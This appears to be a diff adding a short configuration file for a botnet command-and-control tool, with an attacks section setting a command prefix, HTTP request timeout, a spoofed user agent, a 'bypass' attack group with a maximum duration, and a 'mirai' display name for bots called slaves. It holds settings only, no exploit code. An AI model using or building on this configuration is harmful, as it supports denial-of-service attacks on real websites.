@@ -1,0 +1,18 @@
+[attacks]
+#stores the attack prefix
+#to launch an attack you will need to preconfigure in here
+prefix="!"
+kv_prefix="-"
+#stores the attack timeout
+#this will store http request timeout settings
+timeoutunit="second"
+timeout=1
+#stores the user agent for the request
+#this will be preset on the request for the http reqeust
+useragent="Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254"
+attack_groups=[
+    {group="bypass", maxtime=100}
+]
+
+default_type=""
+slaves_display="mirai"
